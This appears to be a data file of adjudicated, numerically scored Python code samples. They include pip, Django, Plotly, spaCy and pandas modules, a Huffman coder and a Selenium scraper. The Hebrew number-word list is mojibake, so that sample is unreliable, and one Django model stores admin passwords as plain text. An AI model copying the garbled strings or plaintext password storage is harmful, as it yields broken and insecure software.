436	adjudicated	1	"""""""xmlrpclib.Transport implementation<<NEWL>>""""""<<NEWL>><<NEWL>>import logging<<NEWL>>import urllib.parse<<NEWL>>import xmlrpc.client<<NEWL>>from typing import TYPE_CHECKING, Tuple<<NEWL>><<NEWL>>from pip._internal.exceptions import NetworkConnectionError<<NEWL>>from pip._internal.network.session import PipSession<<NEWL>>from pip._internal.network.utils import raise_for_status<<NEWL>><<NEWL>>if TYPE_CHECKING:<<NEWL>>    from xmlrpc.client import _HostType, _Marshallable<<NEWL>><<NEWL>>logger = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>class PipXmlrpcTransport(xmlrpc.client.Transport):<<NEWL>>    """"""Provide a `xmlrpclib.Transport` implementation via a `PipSession`<<NEWL>>    object.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self, index_url: str, session: PipSession, use_datetime: bool = False<<NEWL>>    ) -> None:<<NEWL>>        super().__init__(use_datetime)<<NEWL>>        index_parts = urllib.parse.urlparse(index_url)<<NEWL>>        self._scheme = index_parts.scheme<<NEWL>>        self._session = session<<NEWL>><<NEWL>>    def request(<<NEWL>>        self,<<NEWL>>        host: ""_HostType"",<<NEWL>>        handler: str,<<NEWL>>        request_body: bytes,<<NEWL>>        verbose: bool = False,<<NEWL>>    ) -> Tuple[""_Marshallable"", ...]:<<NEWL>>        assert isinstance(host, str)<<NEWL>>        parts = (self._scheme, host, handler, None, None, None)<<NEWL>>        url = urllib.parse.urlunparse(parts)<<NEWL>>        try:<<NEWL>>            headers = {""Content-Type"": ""text/xml""}<<NEWL>>            response = self._session.post(<<NEWL>>                url,<<NEWL>>                data=request_body,<<NEWL>>                headers=headers,<<NEWL>>                stream=True,<<NEWL>>            )<<NEWL>>            raise_for_status(response)<<NEWL>>            self.verbose = verbose<<NEWL>>            return self.parse_response(response.raw)<<NEWL>>        except NetworkConnectionError as exc:<<NEWL>>            assert exc.response<<NEWL>>            logger.critical(<<NEWL>>                ""HTTP error %s while getting %s"",<<NEWL>>                exc.response.status_code,<<NEWL>>                url,<<NEWL>>            )<<NEWL>>            raise"
467	adjudicated	2	"import json<<NEWL>><<NEWL>>from django import forms<<NEWL>>from django.core.exceptions import ValidationError<<NEWL>>from django.utils.translation import gettext_lazy as _<<NEWL>><<NEWL>>__all__ = [""HStoreField""]<<NEWL>><<NEWL>><<NEWL>>class HStoreField(forms.CharField):<<NEWL>>    """"""<<NEWL>>    A field for HStore data which accepts dictionary JSON input.<<NEWL>>    """"""<<NEWL>><<NEWL>>    widget = forms.Textarea<<NEWL>>    default_error_messages = {<<NEWL>>        ""invalid_json"": _(""Could not load JSON data.""),<<NEWL>>        ""invalid_format"": _(""Input must be a JSON dictionary.""),<<NEWL>>    }<<NEWL>><<NEWL>>    def prepare_value(self, value):<<NEWL>>        if isinstance(value, dict):<<NEWL>>            return json.dumps(value)<<NEWL>>        return value<<NEWL>><<NEWL>>    def to_python(self, value):<<NEWL>>        if not value:<<NEWL>>            return {}<<NEWL>>        if not isinstance(value, dict):<<NEWL>>            try:<<NEWL>>                value = json.loads(value)<<NEWL>>            except json.JSONDecodeError:<<NEWL>>                raise ValidationError(<<NEWL>>                    self.error_messages[""invalid_json""],<<NEWL>>                    code=""invalid_json"",<<NEWL>>                )<<NEWL>><<NEWL>>        if not isinstance(value, dict):<<NEWL>>            raise ValidationError(<<NEWL>>                self.error_messages[""invalid_format""],<<NEWL>>                code=""invalid_format"",<<NEWL>>            )<<NEWL>><<NEWL>>        # Cast everything to strings for ease.<<NEWL>>        for key, val in value.items():<<NEWL>>            if val is not None:<<NEWL>>                val = str(val)<<NEWL>>            value[key] = val<<NEWL>>        return value<<NEWL>><<NEWL>>    def has_changed(self, initial, data):<<NEWL>>        """"""<<NEWL>>        Return True if data differs from initial.<<NEWL>>        """"""<<NEWL>>        # For purposes of seeing whether something has changed, None is<<NEWL>>        # the same as an empty dict, if the data or initial value we get<<NEWL>>        # is None, replace it w/ {}.<<NEWL>>        initial_value = self.to_python(initial)<<NEWL>>        return super().has_changed(initial_value, data)"
494	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""insidetextfont"", parent_name=""funnel"", **kwargs):<<NEWL>>        super(InsidetextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
453	adjudicated	0	"from node import HuffmanNode<<NEWL>><<NEWL>><<NEWL>>class Huffman():<<NEWL>><<NEWL>>    def __init__(self, s:str) -> None:<<NEWL>>        self.__weights = self.__get_weights(s)<<NEWL>>        self.__buffer = [b' ' for _ in range(round(len(self.__weights)))]<<NEWL>>        self.__tree = self.__build_huffman_tree(self.__weights)<<NEWL>>        self.__code = self.__build_code(self.__tree)<<NEWL>><<NEWL>>    @property<<NEWL>>    def weights(self):<<NEWL>>        return self.__weights<<NEWL>><<NEWL>>    @property<<NEWL>>    def tree(self):<<NEWL>>        return self.__tree<<NEWL>><<NEWL>>    @property<<NEWL>>    def code(self):<<NEWL>>        return self.__code<<NEWL>><<NEWL>>    def __get_weights(self, s:str) -> dict:<<NEWL>>        weights = dict()<<NEWL>>        for i in s:<<NEWL>>            weights[i] = weights.get(i, 0)+1<<NEWL>>        return weights<<NEWL>>    <<NEWL>>    def __build_huffman_tree(self, weights:dict):<<NEWL>>        nodes = [HuffmanNode(value, weight) for value,weight in weights.items()]<<NEWL>>        while len(nodes) > 1:<<NEWL>>            nodes.sort(key=lambda node:node.weight, reverse=True)<<NEWL>>            c = HuffmanNode(value=None, weight=(nodes[-1].weight+nodes[-2].weight))<<NEWL>>            c.left_node = nodes.pop()<<NEWL>>            c.right_node = nodes.pop()<<NEWL>>            nodes.append(c)<<NEWL>>        return nodes[0]<<NEWL>><<NEWL>>    def __build_code(self, tree):<<NEWL>>        <<NEWL>>        def func(tree:HuffmanNode, length:int):<<NEWL>>            nonlocal code, self<<NEWL>>            node = tree<<NEWL>>            if not node:<<NEWL>>                return<<NEWL>>            elif node.value:<<NEWL>>                code[node.value] = b''.join( self.__buffer[:length] )<<NEWL>>                return<<NEWL>>            self.__buffer[length] = b'0'<<NEWL>>            func(node.left_node, length+1)<<NEWL>>            self.__buffer[length] = b'1'<<NEWL>>            func(node.right_node, length+1)<<NEWL>>        <<NEWL>>        code = dict()<<NEWL>>        func(tree, 0)<<NEWL>>        return code<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    s = ""aabbccdddeefgenajojfonadkjfwqnioaerweggrefdsfassasdfgr""<<NEWL>><<NEWL>>    huffman = Huffman(s)<<NEWL>><<NEWL>>    print(huffman.weights)<<NEWL>>    print(huffman.code)"
513	adjudicated	1	"# coding: utf8<<NEWL>>from __future__ import unicode_literals<<NEWL>><<NEWL>>from ...attrs import LIKE_NUM<<NEWL>><<NEWL>>_num_words = [<<NEWL>>    ""××¤×¡"",<<NEWL>>    ""×××"",<<NEWL>>    ""×××ª"",<<NEWL>>    ""×©×ª×××"",<<NEWL>>    ""×©×ª××"",<<NEWL>>    ""×©× ×××"",<<NEWL>>    ""×©× ××"",<<NEWL>>    ""×©×××©"",<<NEWL>>    ""×©×××©×"",<<NEWL>>    ""××¨××¢"",<<NEWL>>    ""××¨××¢×"",<<NEWL>>    ""×××©"",<<NEWL>>    ""××××©×"",<<NEWL>>    ""×©×©"",<<NEWL>>    ""×©××©×"",<<NEWL>>    ""×©××¢"",<<NEWL>>    ""×©××¢×"",<<NEWL>>    ""×©××× ×"",<<NEWL>>    ""×ª×©×¢"",<<NEWL>>    ""×ª×©×¢×"",<<NEWL>>    ""×¢×©×¨"",<<NEWL>>    ""×¢×©×¨×"",<<NEWL>>    ""××× ×¢×©×¨"",<<NEWL>>    ""×××ª ×¢×©×¨×"",<<NEWL>>    ""×©× ×× ×¢×©×¨"",<<NEWL>>    ""×©×ª×× ×¢×©×¨×"",<<NEWL>>    ""×©×××©× ×¢×©×¨"",<<NEWL>>    ""×©×××© ×¢×©×¨×"",<<NEWL>>    ""××¨××¢× ×¢×©×¨"",<<NEWL>>    ""××¨××¢ ×¢×©×¨×"",<<NEWL>>    ""××××©× ×¢×©×¨"",<<NEWL>>    ""×××© ×¢×©×¨×"",<<NEWL>>    ""×©×©× ×¢×©×¨"",<<NEWL>>    ""×©×© ×¢×©×¨×"",<<NEWL>>    ""×©××¢× ×¢×©×¨"",<<NEWL>>    ""×©××¢ ×¢×©×¨×"",<<NEWL>>    ""×©××× × ×¢×©×¨"",<<NEWL>>    ""×©××× × ×¢×©×¨×"",<<NEWL>>    ""×ª×©×¢× ×¢×©×¨"",<<NEWL>>    ""×ª×©×¢ ×¢×©×¨×"",<<NEWL>>    ""×¢×©×¨××"",<<NEWL>>    ""×©×××©××"",<<NEWL>>    ""××¨××¢××"",<<NEWL>>    ""××××©××"",<<NEWL>>    ""×©××©××"",<<NEWL>>    ""×©××¢××"",<<NEWL>>    ""×©××× ××"",<<NEWL>>    ""×ª×©×¢××"",<<NEWL>>    ""×××"",<<NEWL>>    ""×××£"",<<NEWL>>    ""×××××"",<<NEWL>>    ""×××××¨×"",<<NEWL>>    ""××¨×××××"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>_ordinal_words = [<<NEWL>>    ""×¨××©××"",<<NEWL>>    ""×©× ×"",<<NEWL>>    ""×©×××©×"",<<NEWL>>    ""×¨×××¢×"",<<NEWL>>    ""××××©×"",<<NEWL>>    ""×©××©×"",<<NEWL>>    ""×©×××¢×"",<<NEWL>>    ""×©××× ×"",<<NEWL>>    ""×ª×©××¢×"",<<NEWL>>    ""×¢×©××¨×"",<<NEWL>>]<<NEWL>><<NEWL>>def like_num(text):<<NEWL>>    if text.startswith((""+"", ""-"", ""Â±"", ""~"")):<<NEWL>>        text = text[1:]<<NEWL>>    text = text.replace("","", """").replace(""."", """")<<NEWL>>    if text.isdigit():<<NEWL>>        return True<<NEWL>><<NEWL>>    if text.count(""/"") == 1:<<NEWL>>        num, denom = text.split(""/"")<<NEWL>>        if num.isdigit() and denom.isdigit():<<NEWL>>            return True<<NEWL>>    <<NEWL>>    if text in _num_words:<<NEWL>>        return True<<NEWL>><<NEWL>>    # CHeck ordinal number<<NEWL>>    if text in _ordinal_words:<<NEWL>>        return True<<NEWL>>    return False<<NEWL>><<NEWL>><<NEWL>>LEX_ATTRS = {LIKE_NUM: like_num}"
402	adjudicated	4	"# This file is distributed under the same license as the Django package.<<NEWL>>#<<NEWL>># The *_FORMAT strings use the Django date format syntax,<<NEWL>># see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date<<NEWL>>DATE_FORMAT = ""l, j F, Y""<<NEWL>>TIME_FORMAT = ""h:i a""<<NEWL>>DATETIME_FORMAT = ""j F, Y h:i a""<<NEWL>>YEAR_MONTH_FORMAT = ""F, Y""<<NEWL>>MONTH_DAY_FORMAT = ""j F""<<NEWL>>SHORT_DATE_FORMAT = ""j.M.Y""<<NEWL>>SHORT_DATETIME_FORMAT = ""j.M.Y H:i""<<NEWL>>FIRST_DAY_OF_WEEK = 1  # (Monday)<<NEWL>><<NEWL>># The *_INPUT_FORMATS strings use the Python strftime format syntax,<<NEWL>># see https://docs.python.org/library/datetime.html#strftime-strptime-behavior<<NEWL>># Kept ISO formats as they are in first position<<NEWL>>DATE_INPUT_FORMATS = [<<NEWL>>    ""%Y-%m-%d"",  # '2006-10-25'<<NEWL>>    ""%m/%d/%Y"",  # '10/25/2006'<<NEWL>>    ""%m/%d/%y"",  # '10/25/06'<<NEWL>>    ""%d.%m.%Y"",  # '25.10.2006'<<NEWL>>    ""%d.%m.%y"",  # '25.10.06'<<NEWL>>    # ""%d %b %Y"",  # '25 Oct 2006'<<NEWL>>    # ""%d %b, %Y"",  # '25 Oct, 2006'<<NEWL>>    # ""%d %b. %Y"",  # '25 Oct. 2006'<<NEWL>>    # ""%d %B %Y"",  # '25 October 2006'<<NEWL>>    # ""%d %B, %Y"",  # '25 October, 2006'<<NEWL>>]<<NEWL>>DATETIME_INPUT_FORMATS = [<<NEWL>>    ""%Y-%m-%d %H:%M:%S"",  # '2006-10-25 14:30:59'<<NEWL>>    ""%Y-%m-%d %H:%M:%S.%f"",  # '2006-10-25 14:30:59.000200'<<NEWL>>    ""%Y-%m-%d %H:%M"",  # '2006-10-25 14:30'<<NEWL>>    ""%d.%m.%Y %H:%M:%S"",  # '25.10.2006 14:30:59'<<NEWL>>    ""%d.%m.%Y %H:%M:%S.%f"",  # '25.10.2006 14:30:59.000200'<<NEWL>>    ""%d.%m.%Y %H:%M"",  # '25.10.2006 14:30'<<NEWL>>    ""%d.%m.%y %H:%M:%S"",  # '25.10.06 14:30:59'<<NEWL>>    ""%d.%m.%y %H:%M:%S.%f"",  # '25.10.06 14:30:59.000200'<<NEWL>>    ""%d.%m.%y %H:%M"",  # '25.10.06 14:30'<<NEWL>>    ""%m/%d/%Y %H:%M:%S"",  # '10/25/2006 14:30:59'<<NEWL>>    ""%m/%d/%Y %H:%M:%S.%f"",  # '10/25/2006 14:30:59.000200'<<NEWL>>    ""%m/%d/%Y %H:%M"",  # '10/25/2006 14:30'<<NEWL>>    ""%m/%d/%y %H:%M:%S"",  # '10/25/06 14:30:59'<<NEWL>>    ""%m/%d/%y %H:%M:%S.%f"",  # '10/25/06 14:30:59.000200'<<NEWL>>    ""%m/%d/%y %H:%M"",  # '10/25/06 14:30'<<NEWL>>]<<NEWL>>DECIMAL_SEPARATOR = "".""<<NEWL>>THOUSAND_SEPARATOR = "" ""<<NEWL>>NUMBER_GROUPING = 3"
480	adjudicated	1	"""""""<<NEWL>>Customized Mixin2to3 support:<<NEWL>><<NEWL>> - adds support for converting doctests<<NEWL>><<NEWL>><<NEWL>>This module raises an ImportError on Python 2.<<NEWL>>""""""<<NEWL>><<NEWL>>from distutils.util import Mixin2to3 as _Mixin2to3<<NEWL>>from distutils import log<<NEWL>>from lib2to3.refactor import RefactoringTool, get_fixers_from_package<<NEWL>><<NEWL>>import setuptools<<NEWL>><<NEWL>><<NEWL>>class DistutilsRefactoringTool(RefactoringTool):<<NEWL>>    def log_error(self, msg, *args, **kw):<<NEWL>>        log.error(msg, *args)<<NEWL>><<NEWL>>    def log_message(self, msg, *args):<<NEWL>>        log.info(msg, *args)<<NEWL>><<NEWL>>    def log_debug(self, msg, *args):<<NEWL>>        log.debug(msg, *args)<<NEWL>><<NEWL>><<NEWL>>class Mixin2to3(_Mixin2to3):<<NEWL>>    def run_2to3(self, files, doctests=False):<<NEWL>>        # See of the distribution option has been set, otherwise check the<<NEWL>>        # setuptools default.<<NEWL>>        if self.distribution.use_2to3 is not True:<<NEWL>>            return<<NEWL>>        if not files:<<NEWL>>            return<<NEWL>>        log.info(""Fixing "" + "" "".join(files))<<NEWL>>        self.__build_fixer_names()<<NEWL>>        self.__exclude_fixers()<<NEWL>>        if doctests:<<NEWL>>            if setuptools.run_2to3_on_doctests:<<NEWL>>                r = DistutilsRefactoringTool(self.fixer_names)<<NEWL>>                r.refactor(files, write=True, doctests_only=True)<<NEWL>>        else:<<NEWL>>            _Mixin2to3.run_2to3(self, files)<<NEWL>><<NEWL>>    def __build_fixer_names(self):<<NEWL>>        if self.fixer_names:<<NEWL>>            return<<NEWL>>        self.fixer_names = []<<NEWL>>        for p in setuptools.lib2to3_fixer_packages:<<NEWL>>            self.fixer_names.extend(get_fixers_from_package(p))<<NEWL>>        if self.distribution.use_2to3_fixers is not None:<<NEWL>>            for p in self.distribution.use_2to3_fixers:<<NEWL>>                self.fixer_names.extend(get_fixers_from_package(p))<<NEWL>><<NEWL>>    def __exclude_fixers(self):<<NEWL>>        excluded_fixers = getattr(self, 'exclude_fixers', [])<<NEWL>>        if self.distribution.use_2to3_exclude_fixers is not None:<<NEWL>>            excluded_fixers.extend(self.distribution.use_2to3_exclude_fixers)<<NEWL>>        for fixer_name in excluded_fixers:<<NEWL>>            if fixer_name in self.fixer_names:<<NEWL>>                self.fixer_names.remove(fixer_name)"
422	adjudicated	3	"import importlib.metadata<<NEWL>>from typing import Any, Optional, Protocol, cast<<NEWL>><<NEWL>><<NEWL>>class BadMetadata(ValueError):<<NEWL>>    def __init__(self, dist: importlib.metadata.Distribution, *, reason: str) -> None:<<NEWL>>        self.dist = dist<<NEWL>>        self.reason = reason<<NEWL>><<NEWL>>    def __str__(self) -> str:<<NEWL>>        return f""Bad metadata in {self.dist} ({self.reason})""<<NEWL>><<NEWL>><<NEWL>>class BasePath(Protocol):<<NEWL>>    """"""A protocol that various path objects conform.<<NEWL>><<NEWL>>    This exists because importlib.metadata uses both ``pathlib.Path`` and<<NEWL>>    ``zipfile.Path``, and we need a common base for type hints (Union does not<<NEWL>>    work well since ``zipfile.Path`` is too new for our linter setup).<<NEWL>><<NEWL>>    This does not mean to be exhaustive, but only contains things that present<<NEWL>>    in both classes *that we need*.<<NEWL>>    """"""<<NEWL>><<NEWL>>    @property<<NEWL>>    def name(self) -> str:<<NEWL>>        raise NotImplementedError()<<NEWL>><<NEWL>>    @property<<NEWL>>    def parent(self) -> ""BasePath"":<<NEWL>>        raise NotImplementedError()<<NEWL>><<NEWL>><<NEWL>>def get_info_location(d: importlib.metadata.Distribution) -> Optional[BasePath]:<<NEWL>>    """"""Find the path to the distribution's metadata directory.<<NEWL>><<NEWL>>    HACK: This relies on importlib.metadata's private ``_path`` attribute. Not<<NEWL>>    all distributions exist on disk, so importlib.metadata is correct to not<<NEWL>>    expose the attribute as public. But pip's code base is old and not as clean,<<NEWL>>    so we do this to avoid having to rewrite too many things. Hopefully we can<<NEWL>>    eliminate this some day.<<NEWL>>    """"""<<NEWL>>    return getattr(d, ""_path"", None)<<NEWL>><<NEWL>><<NEWL>>def get_dist_name(dist: importlib.metadata.Distribution) -> str:<<NEWL>>    """"""Get the distribution's project name.<<NEWL>><<NEWL>>    The ``name`` attribute is only available in Python 3.10 or later. We are<<NEWL>>    targeting exactly that, but Mypy does not know this.<<NEWL>>    """"""<<NEWL>>    name = cast(Any, dist).name<<NEWL>>    if not isinstance(name, str):<<NEWL>>        raise BadMetadata(dist, reason=""invalid metadata entry 'name'"")<<NEWL>>    return name"
447	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class LineValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""line"", parent_name=""scatterpolar"", **kwargs):<<NEWL>>        super(LineValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Line""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            backoff<<NEWL>>                Sets the line back off from the end point of<<NEWL>>                the nth line segment (in px). This option is<<NEWL>>                useful e.g. to avoid overlap with arrowhead<<NEWL>>                markers. With ""auto"" the lines would trim<<NEWL>>                before markers if `marker.angleref` is set to<<NEWL>>                ""previous"".<<NEWL>>            backoffsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `backoff`.<<NEWL>>            color<<NEWL>>                Sets the line color.<<NEWL>>            dash<<NEWL>>                Sets the dash style of lines. Set to a dash<<NEWL>>                type string (""solid"", ""dot"", ""dash"",<<NEWL>>                ""longdash"", ""dashdot"", or ""longdashdot"") or a<<NEWL>>                dash length list in px (eg ""5px,10px,2px,2px"").<<NEWL>>            shape<<NEWL>>                Determines the line shape. With ""spline"" the<<NEWL>>                lines are drawn using spline interpolation. The<<NEWL>>                other available values correspond to step-wise<<NEWL>>                line shapes.<<NEWL>>            smoothing<<NEWL>>                Has an effect only if `shape` is set to<<NEWL>>                ""spline"" Sets the amount of smoothing. 0<<NEWL>>                corresponds to no smoothing (equivalent to a<<NEWL>>                ""linear"" shape).<<NEWL>>            width<<NEWL>>                Sets the line width (in px).<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
416	adjudicated	0	"import pytest<<NEWL>><<NEWL>>from pandas import (<<NEWL>>    DatetimeIndex,<<NEWL>>    date_range,<<NEWL>>)<<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>def astype_non_nano(dti_nano, unit):<<NEWL>>    # TODO(2.0): remove once DTI/DTA.astype supports non-nano<<NEWL>>    if unit == ""ns"":<<NEWL>>        return dti_nano<<NEWL>><<NEWL>>    dta_nano = dti_nano._data<<NEWL>>    arr_nano = dta_nano._ndarray<<NEWL>><<NEWL>>    arr = arr_nano.astype(f""M8[{unit}]"")<<NEWL>>    if dti_nano.tz is None:<<NEWL>>        dtype = arr.dtype<<NEWL>>    else:<<NEWL>>        dtype = type(dti_nano.dtype)(tz=dti_nano.tz, unit=unit)<<NEWL>>    dta = type(dta_nano)._simple_new(arr, dtype=dtype)<<NEWL>>    dti = DatetimeIndex(dta, name=dti_nano.name)<<NEWL>>    assert dti.dtype == dtype<<NEWL>>    return dti<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.filterwarnings(""ignore::DeprecationWarning"")<<NEWL>>@pytest.mark.parametrize(""tz"", [None, ""Asia/Shanghai"", ""Europe/Berlin""])<<NEWL>>@pytest.mark.parametrize(""name"", [None, ""my_dti""])<<NEWL>>@pytest.mark.parametrize(""unit"", [""ns"", ""us"", ""ms"", ""s""])<<NEWL>>def test_dti_snap(name, tz, unit):<<NEWL>>    dti = DatetimeIndex(<<NEWL>>        [<<NEWL>>            ""1/1/2002"",<<NEWL>>            ""1/2/2002"",<<NEWL>>            ""1/3/2002"",<<NEWL>>            ""1/4/2002"",<<NEWL>>            ""1/5/2002"",<<NEWL>>            ""1/6/2002"",<<NEWL>>            ""1/7/2002"",<<NEWL>>        ],<<NEWL>>        name=name,<<NEWL>>        tz=tz,<<NEWL>>        freq=""D"",<<NEWL>>    )<<NEWL>>    dti = astype_non_nano(dti, unit)<<NEWL>><<NEWL>>    result = dti.snap(freq=""W-MON"")<<NEWL>>    expected = date_range(""12/31/2001"", ""1/7/2002"", name=name, tz=tz, freq=""w-mon"")<<NEWL>>    expected = expected.repeat([3, 4])<<NEWL>>    expected = astype_non_nano(expected, unit)<<NEWL>>    tm.assert_index_equal(result, expected)<<NEWL>>    assert result.tz == expected.tz<<NEWL>>    assert result.freq is None<<NEWL>>    assert expected.freq is None<<NEWL>><<NEWL>>    result = dti.snap(freq=""B"")<<NEWL>><<NEWL>>    expected = date_range(""1/1/2002"", ""1/7/2002"", name=name, tz=tz, freq=""b"")<<NEWL>>    expected = expected.repeat([1, 1, 1, 2, 2])<<NEWL>>    expected = astype_non_nano(expected, unit)<<NEWL>>    tm.assert_index_equal(result, expected)<<NEWL>>    assert result.tz == expected.tz<<NEWL>>    assert result.freq is None<<NEWL>>    assert expected.freq is None"
218	adjudicated	0	from django.db import models<<NEWL>><<NEWL>># Create your models here.<<NEWL>>class RTOadmin(models.Model):<<NEWL>>    admin_id=models.AutoField(primary_key = True)<<NEWL>>    admin_username=models.CharField(max_length=50)<<NEWL>>    # authentication/forms.py<<NEWL>>    admin_password = models.CharField(max_length=50)<<NEWL>>    # desc=models.CharField(max_length=300)<<NEWL>>    admin_created_date=models.DateField(auto_now_add=True)<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return self.admin_username<<NEWL>>    <<NEWL>>class Vehicle(models.Model): <<NEWL>>    vehicle_id=models.AutoField(primary_key = True)<<NEWL>>    vehicle_no=models.CharField(max_length=50,default=None)<<NEWL>>    vehicle_own_name = models.CharField(max_length=50,default=None)<<NEWL>>    vehicle_own_contact=models.IntegerField(default=None)<<NEWL>>    vehicle_own_add=models.CharField(max_length=100,default=None)<<NEWL>>    vehicle_own_email=models.CharField(max_length=50, default=None)<<NEWL>>    vehicle_company_name=models.CharField(max_length=50,default=None)<<NEWL>>    # vehicle_class=models.CharField(max_length=50,default=None)<<NEWL>>    vehicle_date_reg=models.DateField(default=None)<<NEWL>>    vehicle_chassics_no=models.CharField(max_length=30,default=None)<<NEWL>>    vehicle_eng_no=models.CharField(max_length=30,default=None)<<NEWL>>    vehicle_own_srno=models.IntegerField(default=None)<<NEWL>>    vehicle_fuel_use=models.CharField(max_length=30,default=None)<<NEWL>>    vehicle_Seat_cap=models.IntegerField(default=None)<<NEWL>>    vehicle_model_name=models.CharField(max_length=50,default=None)<<NEWL>>    vehicle_created_date=models.DateField(auto_now_add=True)  <<NEWL>>    vehicle_last_login=models.CharField(max_length=30,default=None)<<NEWL>><<NEWL>>    def __str__(self):  <<NEWL>>        return self.vehicle_no<<NEWL>><<NEWL>>class Rules(models.Model):<<NEWL>>    rule_id=models.AutoField(primary_key= True)<<NEWL>>    rule_code=models.CharField(max_length=50)<<NEWL>>    rule_desc=models.CharField(max_length=100,blank=True)<<NEWL>>    rule_sect = models.CharField(max_length=50,null=True)<<NEWL>>    rule_pen=models.CharField(max_length=100,null=True)<<NEWL>>    # rule_date=models.DateField(default=None)<<NEWL>>    def __str__(self):  <<NEWL>>        return self.rule_code
189	adjudicated	3	"from selenium import webdriver<<NEWL>>from selenium.webdriver.chrome.service import Service<<NEWL>>from selenium.webdriver.common.by import By<<NEWL>>from selenium.webdriver.common.keys import Keys<<NEWL>>from selenium.webdriver.chrome.options import Options<<NEWL>>from selenium.webdriver.support.ui import WebDriverWait<<NEWL>>from selenium.webdriver.support import expected_conditions as EC<<NEWL>>import csv<<NEWL>>import time<<NEWL>><<NEWL>>url = ""https://u.gg/lol/tier-list""<<NEWL>><<NEWL>>options = Options()<<NEWL>>options.add_argument(""--headless"") # Run Chrome in headless mode<<NEWL>>service = Service(""chromedriver.exe"") # Path to your Chromedriver executable<<NEWL>>driver = webdriver.Chrome(service=service, options=options)<<NEWL>><<NEWL>>driver.get(url)<<NEWL>><<NEWL>>file = open(""Tierlist.csv"", 'w')<<NEWL>>writer = csv.writer(file)<<NEWL>><<NEWL>>wait = WebDriverWait(driver, 10)<<NEWL>>wait.until(EC.presence_of_all_elements_located((By.CSS_SELECTOR, ""div.rt-tr-group"")))<<NEWL>><<NEWL>>champions = []<<NEWL>>win_rates = []<<NEWL>>pick_rates = []<<NEWL>><<NEWL>>writer.writerow(['Champion Name', 'Win rate', 'Pick Rate'])<<NEWL>><<NEWL>>while True:<<NEWL>>    # Scroll to the bottom of the page<<NEWL>>    driver.execute_script(""window.scrollTo(0, document.body.scrollHeight);"")<<NEWL>>    time.sleep(1)<<NEWL>>    <<NEWL>>    # Scroll back to the top of the page<<NEWL>>    driver.execute_script(""window.scrollTo(0, 0);"")<<NEWL>>    time.sleep(1)<<NEWL>>    <<NEWL>>    # Check if all rows have been loaded<<NEWL>>    rows = driver.find_elements(By.CSS_SELECTOR, ""div.rt-tr-group"")<<NEWL>>    if len(rows) == len(champions):<<NEWL>>        break<<NEWL>>    <<NEWL>>    # Otherwise, continue to extract the data<<NEWL>>    for i in range(len(champions), len(rows)):<<NEWL>>        row = rows[i]<<NEWL>>        champion = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(3)"").get_attribute(""textContent"")<<NEWL>>        win_rate = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(5)"").text.strip()<<NEWL>>        pick_rate = row.find_element(By.CSS_SELECTOR, ""div.rt-td:nth-of-type(6)"").text.strip()<<NEWL>>            <<NEWL>>        champions.append(champion)<<NEWL>>        win_rates.append(win_rate)<<NEWL>>        pick_rates.append(pick_rate)<<NEWL>><<NEWL>>        writer.writerow([champion, win_rate, pick_rate])<<NEWL>><<NEWL>>print(champions)<<NEWL>>print(win_rates)<<NEWL>>print(pick_rates)<<NEWL>><<NEWL>>driver.quit()"
